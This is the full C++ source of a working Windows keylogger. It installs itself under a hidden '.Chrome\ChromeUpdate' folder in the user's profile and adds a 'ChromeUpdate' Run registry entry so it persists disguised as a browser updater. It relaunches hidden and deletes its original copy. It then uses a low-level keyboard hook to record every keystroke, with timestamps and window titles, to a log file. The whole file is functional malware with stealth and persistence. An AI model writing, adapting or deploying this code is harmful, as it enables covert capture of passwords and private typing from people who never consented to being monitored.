
#include <stdio.h>
#include <string.h>
#include <strsafe.h>
#include <Windows.h>
#include <Shlobj_core.h>
#include <iostream>
#include <fstream>
#include <sstream>

using namespace std;

#define BUFFER_SIZE 1024
#define LOG_FILE L"keyboard.log"

HHOOK keyboardHook;
ofstream logFile;

void logToFile(int vkCode);
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
void install();
void setHook();


int main(int argc, char** argv) {

	if (argc == 1)
	{
		install();
		return 0;
	}

	Sleep(10000);
	DeleteFileA(argv[1]);
	//ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // if 0, invisible window; if 1, visible window

	//open in appending mode
	logFile.open(LOG_FILE, ofstream::app);

	setHook();
	logFile.close();
	return 0;

}

//persistence
void install() {
	wchar_t currentPath[BUFFER_SIZE];
	wchar_t destPath[BUFFER_SIZE];
	PWSTR homeDir;

	//get full file path
	if (!GetModuleFileName(NULL, currentPath, BUFFER_SIZE)) {

		printf("Cant get current file path\n");
		return;

	}

	if (wcsstr(currentPath, L"\\.Chrome\\ChromeUpdate\\keylogger.exe")) {

		return;

	}

	//Retrieves the full path of a known folder identified by the folder's KNOWNFOLDERID.
	//FOLDERID_Profile default path: %USERPROFILE% (%SystemDrive%\Users\%USERNAME%)  (https://docs.microsoft.com/en-us/windows/win32/shell/knownfolderid)
	if (SHGetKnownFolderPath(FOLDERID_Profile, 0, NULL, &homeDir) != S_OK) {

		printf("SHGetKnownFolderPath failed");
		return;

	}

	StringCchPrintf(destPath, BUFFER_SIZE, L"%s\\.Chrome\\ChromeUpdate", homeDir);

	//create dir
	SHCreateDirectoryEx(NULL, destPath, NULL);
	StringCbCat(destPath, BUFFER_SIZE, L"\\keylogger.exe\0");


	//move to hide (replace if already exits and make a copy if cant move)
	if (!CopyFile(currentPath, destPath, FALSE)) {

		printf("Cant move file\n");
		return;
	}

	HKEY hRunKey = NULL;

	//persistence
	if (RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
		0, KEY_SET_VALUE, &hRunKey) != ERROR_SUCCESS) { //KEY_SET_VALUE: Required to create, delete, or set a registry value.

		printf("Cant open registry key\n");
		return;
	}

	wchar_t cmd[1024];
	StringCchPrintf(cmd, BUFFER_SIZE, L"%s %s", destPath, currentPath);

	if (RegSetValueEx(hRunKey, L"ChromeUpdate ", 0, REG_SZ, (CONST BYTE*)cmd, sizeof(wchar_t) * wcslen(cmd)) != ERROR_SUCCESS) {

		printf("Cant set value under registry key\n");
		return;
	}
	RegCloseKey(hRunKey);

	STARTUPINFO startupInfo;
	PROCESS_INFORMATION procInfo;
	ZeroMemory(&startupInfo, sizeof(startupInfo));
	ZeroMemory(&procInfo, sizeof(procInfo));


	startupInfo.wShowWindow = SW_HIDE;
	startupInfo.cb = sizeof(startupInfo);


	if (!CreateProcessW(NULL, (LPWSTR)cmd,
		NULL, NULL, TRUE, 0,
		NULL, NULL,
		&startupInfo, &procInfo)) {

		printf("Cant create process\n");
		return;
	}
	CloseHandle(procInfo.hProcess);
	CloseHandle(procInfo.hThread);
}

void setHook() {

	//keyboard handle
	if ( !(keyboardHook = SetWindowsHookExA(WH_KEYBOARD_LL, (HOOKPROC)LowLevelKeyboardProc, (HINSTANCE)NULL, NULL)) ) {

		printf("Set window hook failed\n");
		return;

	}
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	UnhookWindowsHookEx(keyboardHook);

}
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {

	
	//wParam case = KEY_DOWN -> log to file
	//callNextHookEx
	if (nCode >= 0) {
		if (wParam == WM_KEYDOWN) {

			PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
			logToFile(p->vkCode);

		}

	}
	return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
	
}


void logToFile(int vkCode) {

	if (vkCode == 1 || vkCode == 2) {		//ignore mouse clicks

		return;
	}

	//get window title
	HWND fg = GetForegroundWindow();

	if (!fg) {

		printf("GetForegroundWindow failed\n");
		return;
	}
	
	char currentWin[256] = { 0 };
	static char lastWin[256] = { 0 };
	char dateFormat[20] = { 0 };
	char timeFormat[20] = { 0 };
	stringstream output;

	GetWindowTextA(fg, currentWin, 256);
	
	if ( strcmp(currentWin, lastWin) != 0 ) {   //if new window then 
		
		StringCchCopyA(lastWin, 256, currentWin);

		//get and format [time][windowTitle]
		SYSTEMTIME currentTime;
		GetLocalTime(&currentTime);
		GetDateFormatA(LOCALE_CUSTOM_DEFAULT, NULL, &currentTime, "dd/MM/yy", dateFormat, 20);
		GetTimeFormatA(LOCALE_CUSTOM_DEFAULT, NULL, &currentTime, "HH:mm:ss", timeFormat, 20);

		output << "\n[" << dateFormat << " " << timeFormat << "] [" << currentWin << "] ";
	}

	switch (vkCode)
	{
	case VK_BACK:
		output << "[backspace]";
		break;
	case VK_RETURN:
		output << "\n";
		break;
	case VK_SPACE:
		output << " ";
		break;
	case VK_TAB:
		output << "[tab]";
		break;
	case VK_SHIFT:
		output << "[shift]"; 
		break;
	case VK_LSHIFT:
		output << "[shift]";
		break;
	case VK_RSHIFT:
		output << "[shift]";
		break;
	case VK_CONTROL:
		output << "[ctrl]";
		break;
	case VK_LCONTROL:
		output << "[ctrl]";
		break;
	case VK_RCONTROL:
		output << "[ctrl]";
		break;
	case VK_MENU:
		output << "[alt]";
		break;
	case VK_LMENU:
		output << "[alt]";
		break;
	case VK_RMENU:
		output << "[alt]";
		break;
	case VK_LWIN:
		output << "[win]";
		break;
	case VK_CAPITAL:
		output << "[caplock]";
		break;
	case VK_ESCAPE:
		output << "[esc]";
		break;
	case VK_END:
		output << "[end]";
		break;
	case VK_HOME:
		output << "[home]";
		break;
	case VK_LEFT:
		output << "[left]";
		break;
	case VK_RIGHT:
		output << "[right]";
		break;
	case VK_UP:
		output << "[up]";
		break;
	case VK_DOWN:
		output << "[down]";
		break;
	case VK_PRIOR:
		output << "[pg up]";
		break;
	case VK_NEXT:
		output << "[pg dn]";
		break;
	case VK_DECIMAL:
		output << ".";
		break;
	case VK_SUBTRACT:
		output << "-";
		break;
	case VK_ADD:
		output << "+";
		break;
	default:
		char c = MapVirtualKeyA(vkCode, MAPVK_VK_TO_CHAR);
		output << c;
		break;
	}

	logFile << output.str();
	cout << output.str();
	//keep file open 
	logFile.flush();
}

